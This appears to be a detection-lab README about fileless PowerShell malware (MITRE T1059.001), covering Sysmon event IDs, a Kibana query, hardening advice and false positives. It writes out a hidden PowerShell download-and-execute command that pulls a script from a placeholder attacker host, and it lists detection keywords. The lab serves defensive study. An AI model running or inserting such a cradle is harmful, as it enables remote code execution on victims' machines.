# 🔧 Use Case: Fileless Malware via PowerShell (MITRE T1059.001)

---

## 📘 Scenario Summary

This simulation demonstrates a **fileless malware attack** using **PowerShell** initiated via a **spear-phishing email**. The payload is never written to disk, instead executing in memory, making it harder to detect by traditional antivirus tools.

The objective is to detect and analyze the PowerShell execution using **Sysmon**, **Winlogbeat**, **Elasticsearch**, and **Kibana**.

---

## 🧪 Attack Simulation Setup

### 🔧 Environment

* **Attacker Machine**: Kali Linux (bridged network)
* **Victim Machine**: Windows 10 Home Edition (bridged network)
* **Monitoring Stack**: Winlogbeat + Sysmon + Elasticsearch + Kibana (configured and verified)

---

## 🔪 Execution Steps

### 🔊 PowerShell Payload (Simulated)

A simple reverse shell or command execution payload in memory:

```powershell
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker.ip>/payload.ps1')"
```


### 🚀 Method of Delivery

Use a simulated phishing email or execute manually on the victim machine for lab purposes.

---

## 📊 Log Sources & Event IDs

| Event ID | Description                             | Source               |
| -------- | --------------------------------------- | -------------------- |
| 1        | Process Creation (e.g., powershell.exe) | Sysmon               |
| 4104     | PowerShell script block logging         | Sysmon   |
| 4688     | A new process has been created          | Windows Security Log |

---

## 🔍 Detection Logic

* Alert if PowerShell runs with:

  * `-nop`, `-w hidden`, `IEX`, or `DownloadString`
* Watch for script block logs containing suspicious commands (`event.code:4104`)
* Track `powershell.exe` execution from uncommon parent processes (e.g., Outlook.exe, explorer.exe)

### Kibana Query Example

```kql
event.code:4104 AND winlog.event_data.ScriptBlockText:(DownloadString OR IEX)
```

---



---

## 🔫 Recommendations

* Disable PowerShell v2 and enforce Constrained Language Mode
* Enable PowerShell logging (module, script block, and transcription)
* Block known malicious PowerShell indicators (e.g., `DownloadString`, `IEX`, encoded commands)
* Use AppLocker or WDAC to limit script execution

---

## ⚠️ Possible False Positives

* IT scripts using automation (legit PowerShell usage)
* Monitoring tools or software installers using `Net.WebClient`


## 📆 Status Summary

| Field               | Value                       |
| ------------------- | --------------------------- |
| 🔬 Detection Tested | ✅ Yes                       |
| 💯 Detection Logic  | ✅ Working                   |
| 🛠️ Simulation Type | Manual (Fileless Execution) |
| 📆 Log Visibility   | ✅ Confirmed in Kibana       |
| 💻 Platform         | Windows 10 Home (Victim)    |

---

## 👀 Kibana Dashboard Screenshot
![alt text](<Shell log.png>)
